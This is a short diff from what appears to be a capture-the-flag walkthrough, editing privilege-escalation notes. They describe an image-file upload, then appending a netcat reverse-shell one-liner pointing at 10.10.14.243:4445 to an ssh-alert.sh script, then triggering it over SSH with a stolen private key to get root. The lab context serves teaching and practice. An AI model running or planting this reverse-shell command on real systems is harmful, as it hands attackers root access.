@@ -24,4 +24,4 @@ put the below into an image file and upload to the website
 
 Make use of the `ssh-alert.sh` script in /usr/local/sbin by appending this `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.243 4445 >/tmp/f` 
 
-Then SSH to svc_acc to trigger the script and get root
+Then SSH to svc_acc with the private key acquired to trigger the script and get root
